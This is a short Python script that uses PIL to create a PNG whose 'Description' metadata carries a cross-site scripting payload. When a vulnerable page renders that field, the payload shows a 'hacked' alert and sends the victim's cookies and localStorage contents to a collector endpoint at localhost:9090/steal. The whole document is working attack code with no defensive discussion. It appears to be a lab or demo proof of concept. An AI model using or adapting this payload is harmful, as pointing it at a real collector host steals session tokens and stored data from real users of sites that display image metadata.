from PIL import Image
from PIL.PngImagePlugin import PngInfo

# create malicious image with xss payload
img = Image.new('RGB', (100, 100), color='red')
metadata = PngInfo()

# xss that shows hacked alert and steals data
xss = '''<img src=x onerror="alert(' YOU HAVE BEEN HACKED! \\nYour data is being stolen...'); fetch('http://localhost:9090/steal?cookies=' + encodeURIComponent(document.cookie) + '&storage=' + encodeURIComponent(JSON.stringify(localStorage))).then(() => alert('✅ Attack complete! Data sent to attacker.\\nCheck: http://localhost:9090/logs'));">'''

metadata.add_text('Description', xss)
img.save('xss_attack.png', pnginfo=metadata)
print('created xss_attack.png with embedded javascript payload')
